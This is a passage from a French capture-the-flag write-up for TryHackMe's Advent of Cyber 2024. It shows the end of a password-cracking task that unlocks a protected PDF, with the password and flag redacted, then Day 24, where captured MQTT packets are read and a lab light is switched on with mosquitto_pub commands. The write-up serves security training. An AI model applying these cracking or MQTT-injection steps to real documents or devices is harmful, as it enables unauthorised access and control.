Use the "--show --format=PDF" options to display all of the cracked passwords reliably
Session completed.
{% endcapture %}
{% include elements/spoil.html %}

```bash
pdftotext private.pdf -upw [...expurgé...]
```

```bash
head -n 5 private.txt
```

{% capture spoil %}
transactions

THM{[...expurgé...]}
date
transaction_ref
{% endcapture %}
{% include elements/spoil.html %}

## Jour 24 : Tu ne peux pas faire de mal à SOC-mas, Mayor Malware

![Communication protocols](https://img.shields.io/badge/Communication%20protocols-314267?logo=tryhackme)

![Jour 24](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1731490380964.svg)

Analyse des paquets {% include dictionary.html word="MQTT" %}

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-24_mqtt.png" caption="Paquets MQTT contenant un topic et un message" %}

En regardant le message en détail, nous constatons qu'il s'agit du texte `on` en héxadécimal.

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-24_challenge.png" caption="Le défi consiste à allumer la lumière en envoyant la bonne requête MQTT via Mosquitto" %}

```bash
mosquitto_pub -h localhost -t "d2FyZXZpbGxl/Y2hyaXN0bWFzbGlnaHRz" -m "6f6e" #N'a pas fonctionné
mosquitto_pub -h localhost -t "d2FyZXZpbGxl/Y2hyaXN0bWFzbGlnaHRz" -m "on"
```

{% include elements/figure_spoil.html image="images/THM/Advent2024/Capture_ecran_2024-12-24_flag.png" caption="Le flag apparaît lorsque le message est correctement envoyé" %}
